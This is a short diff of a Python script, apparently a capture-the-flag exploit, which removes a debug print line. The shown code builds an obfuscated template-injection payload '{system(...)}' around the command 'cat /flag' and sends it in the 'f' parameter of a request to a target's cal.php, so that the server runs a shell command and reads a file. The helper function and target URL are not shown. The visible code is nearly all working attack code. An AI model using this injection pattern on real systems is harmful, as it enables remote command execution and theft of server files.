@@ -8,7 +8,6 @@ def obf(s):
 
 cmd = 'cat /flag'
 payload = '{system(%s)}' % obf(cmd)
-print(payload)
 
 res = requests.get(f"{url}/cal.php?f={payload}")
 
